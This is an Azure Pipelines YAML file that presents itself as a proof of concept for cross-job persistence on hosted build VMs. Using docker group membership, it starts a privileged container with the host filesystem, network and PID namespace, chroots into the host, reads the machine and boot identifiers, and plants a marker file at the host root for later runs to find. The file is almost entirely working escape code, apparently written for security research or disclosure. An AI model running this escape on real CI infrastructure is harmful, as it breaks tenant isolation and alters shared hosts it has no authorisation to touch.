# azure-pipelines.yml
trigger:
- main
pr:
- main

name: $(Date:yyyyMMdd)$(Rev:.r)

stages:
- stage: PersistenceProof
  displayName: 'Final PoC: Test for Cross-Job VM Persistence'
  jobs:
  - job: Host_Persistence_Test
    displayName: 'PoC: Leave and Check for a Persistent Marker'
    pool:
      vmImage: 'ubuntu-22.04'
    steps:
    - checkout: none
    - task: Bash@3
      displayName: 'Capture Host Fingerprint and Test for Persistence'
      inputs:
        targetType: inline
        script: |
          set -euo pipefail
          mkdir -p artifacts
          MARKER_FILE="/persistent_marker.txt"

          echo "--- Verifying container escape vector (Prerequisite) ---"
          if ! (id | grep -q '(docker)'); then
            echo "❌ Vector not found."
            exit 1
          fi
          echo "✅ Container escape vector is present."

          echo "--- ESCAPING CONTAINER TO PERFORM HOST FORENSICS ---"
          
          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
            -v $(pwd)/artifacts:/artifacts \
            alpine:latest sh -c "
              # We need root in the chroot jail
              chroot /hostfs sh -c '
                set -e
                
                echo \"--- [HOST] Capturing stable host fingerprints... ---\"
                (
                  echo -n \"machine-id: \"
                  cat /etc/machine-id
                  echo -n \"boot_id: \"
                  cat /proc/sys/kernel/random/boot_id
                ) > /artifacts/host-fingerprint.txt

                echo \"--- [HOST] Checking for residual marker from a PREVIOUS run... ---\"
                if [ -f \"${MARKER_FILE}\" ]; then
                  echo \"✅✅✅ SMOKING GUN: RESIDUAL MARKER FOUND\" > /artifacts/persistence_verdict.txt
                  echo \"Contents of the marker from the previous run:\" >> /artifacts/persistence_verdict.txt
                  cat \"${MARKER_FILE}\" >> /artifacts/persistence_verdict.txt
                else
                  echo \"ℹ️ Marker not found, host appears to be fresh.\" > /artifacts/persistence_verdict.txt
                fi

                echo \"--- [HOST] Creating a new marker for the NEXT run... ---\"
                (
                  echo \"Marker created by Build Number: ${BUILD_BUILDNUMBER}\"
                  echo \"Timestamp (UTC): $(date -u +\"%Y-%m-%d %H:%M:%S\")\"
                ) > \"${MARKER_FILE}\"
                echo \"Successfully created ${MARKER_FILE} for a future run to find.\"
              '
            "
          
          echo "--- ANALYSIS & VERDICT ---"
          cat artifacts/persistence_verdict.txt

    - task: PublishPipelineArtifact@1
      displayName: 'Publish Persistence Test Artifacts'
      condition: always()
      inputs:
        targetPath: 'artifacts'
        artifact: 'azure-persistence-proof'
